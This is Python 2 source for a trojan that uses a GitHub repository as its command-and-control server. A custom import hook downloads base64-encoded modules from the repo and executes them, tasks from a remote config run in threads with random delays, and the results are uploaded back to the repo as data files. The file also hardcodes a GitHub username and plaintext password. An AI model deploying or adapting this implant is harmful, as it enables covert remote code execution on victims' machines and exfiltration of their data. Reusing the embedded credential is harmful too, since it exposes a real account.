import json
import base64
import sys
import time
import imp
import random
import threading
import Queue
import os

from gittle import Gittle
from gittle import GittleAuth
from github3 import login

repo_path = '/tmp/gittle_bare'
repo_url = "https://github.com/HaiboTu/Trojan.git"
trojan_id = "abc"

trojan_config	 = "%s.json" % trojan_id
data_path		 = "data/%s/" % trojan_id
trojan_modules	 = []
configured		 = False
task_queue		 = Queue.Queue()

class Gitimporter(object):
	def __init__(self):
		self.current_module_code = ""

	def find_module(self, fullname, path = None):
		if configured:
			print "[*] Attempting to retrieve %s" % fullname
			new_library = get_file_contents("%s.py" % fullname)

			if new_library is not None:
				self.current_module_code = base64.b64decode(new_library)
				return self

		return None

	def load_module(self, name):
		module = imp.new_module(name)
		exec self.current_module_code in module.__dict__
		sys.modules[name] = module

		return module

def create_work_path():
	for root, dirs, files in os.walk(repo_path, topdown=False):
		for name in files:
			os.remove(os.path.join(root, name))
		for name in dirs:
			os.rmdir(os.path.join(root, name))

	if not os.path.exists(repo_path):
		os.mkdir(repo_path)

	if not os.path.exists("%s/.git" %repo_path) :
		Gittle.init(repo_path)

	return None

def connect_to_server():

	gh = login(username = "HaiboTu", password = "apple@511126")
	repo = gh.repository("Haibotu", "trojan")
	branch = repo.branch("master")

	return gh, repo, branch

def get_file_contents(filepath):

	gh, repo, branch = connect_to_server()
	tree = branch.commit.commit.tree.recurse()

	for filename in tree.tree:
		if filepath in filename.path:
			print "[*] Found file %s" % filepath
			blob = repo.blob(filename._json_data['sha'])
			return blob.content

	return None

def get_trojan_config():
	global configured

	config_json = get_file_contents(trojan_config)
	config		= json.loads(base64.b64decode(config_json))
	configured	= True

	for task in config:
		if task['module'] not in sys.modules:
			exec("import %s" % task['module'])

	return config

def store_module_result(data):
	gh, repo, branch = connect_to_server()

	remote_path = "data/%s/%d.data" % (trojan_id, random.randint(1000, 100000))

	repo.create_file(remote_path, "Commit message", data)

	return

def module_runner(module):
	task_queue.put(1)
	result = sys.modules[module].run()

	store_module_result(result)

	return

sys.meta_path = [Gitimporter()]

while True:
	if task_queue.empty():
		config = get_trojan_config()

		for task in config:
			t = threading.Thread(target = module_runner, args =
					(task['module'],))
			t.start()
			time.sleep(random.randint(1, 10))

	sys.exit(0)

#	time.sleep(random.randint(1000, 1000))

